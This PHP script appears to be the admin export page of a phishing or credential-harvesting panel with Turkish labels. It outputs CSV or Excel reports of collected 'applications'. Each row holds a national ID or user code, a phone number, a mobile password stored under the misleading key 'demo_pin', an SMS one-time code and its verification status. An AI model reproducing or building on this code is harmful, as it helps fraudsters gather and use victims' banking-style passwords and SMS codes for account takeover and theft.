<?php
declare(strict_types=1);
require_once dirname(__DIR__) . '/includes/storage.php';
requireAdmin();

$format = strtolower(trim((string) ($_GET['format'] ?? 'csv')));
$statusFilter = trim((string) ($_GET['status'] ?? ''));
$search = mb_strtolower(trim((string) ($_GET['search'] ?? '')), 'UTF-8');

if (!in_array($format, ['csv', 'excel'], true)) {
    http_response_code(400);
    echo 'Gecersiz export formati.';
    exit;
}

$applications = sortedApplicationsDesc();
$rows = [];

foreach ($applications as $app) {
    $status = (string) ($app['status'] ?? 'beklemede');
    $statusText = statusLabel($status);
    $mobileStatus = (string) ($app['demo_pin'] ?? '');
    $smsCode = (string) ($app['sms_code'] ?? '');
    $smsVerified = !empty($app['sms_verified']) ? 'Dogrulandi' : 'Bekliyor';
    $createdAt = (string) ($app['created_at'] ?? '');
    $userCode = (string) ($app['user_code'] ?? ($app['national_id'] ?? ''));
    $phone = (string) ($app['phone'] ?? '');
    $id = (string) ($app['id'] ?? '');

    if ($statusFilter !== '' && $statusFilter !== $status) {
        continue;
    }

    if ($search !== '') {
        $haystack = mb_strtolower(
            implode(' ', [$id, $userCode, $phone, $mobileStatus, $smsCode, $smsVerified, $status, $statusText, $createdAt]),
            'UTF-8'
        );
        if (!str_contains($haystack, $search)) {
            continue;
        }
    }

    $rows[] = [
        'Basvuru No' => $id,
        'Kullanici Kodu' => $userCode,
        'Cep Telefonu' => $phone,
        'Mobil Şifre' => $mobileStatus,
        'Sms Şifresi' => $smsCode,
        'Kod Dogrulama' => $smsVerified,
        'Durum' => $statusText,
        'Olusturma' => $createdAt,
    ];
}

$dateTag = date('Ymd_His');

if ($format === 'excel') {
    header('Content-Type: application/vnd.ms-excel; charset=UTF-8');
    header('Content-Disposition: attachment; filename="basvuru_raporu_' . $dateTag . '.xls"');
    echo "\xEF\xBB\xBF";

    $headers = ['Basvuru No', 'Kullanici Kodu', 'Cep Telefonu', 'Mobil Şifre', 'Sms Şifresi', 'Kod Dogrulama', 'Durum', 'Olusturma'];
    echo implode("\t", $headers) . "\n";
    foreach ($rows as $row) {
        $line = [];
        foreach ($headers as $key) {
            $line[] = str_replace(["\t", "\r", "\n"], ' ', (string) ($row[$key] ?? ''));
        }
        echo implode("\t", $line) . "\n";
    }
    exit;
}

header('Content-Type: text/csv; charset=UTF-8');
header('Content-Disposition: attachment; filename="basvuru_raporu_' . $dateTag . '.csv"');

$out = fopen('php://output', 'wb');
if ($out === false) {
    http_response_code(500);
    echo 'Export dosyasi olusturulamadi.';
    exit;
}

fwrite($out, "\xEF\xBB\xBF");
$headers = ['Basvuru No', 'Kullanici Kodu', 'Cep Telefonu', 'Mobil Şifre', 'Sms Şifresi', 'Kod Dogrulama', 'Durum', 'Olusturma'];
fputcsv($out, $headers, ';');
foreach ($rows as $row) {
    fputcsv($out, [
        $row['Basvuru No'] ?? '',
        $row['Kullanici Kodu'] ?? '',
        $row['Cep Telefonu'] ?? '',
        $row['Mobil Şifre'] ?? '',
        $row['Sms Şifresi'] ?? '',
        $row['Kod Dogrulama'] ?? '',
        $row['Durum'] ?? '',
        $row['Olusturma'] ?? '',
    ], ';');
}
fclose($out);
exit;

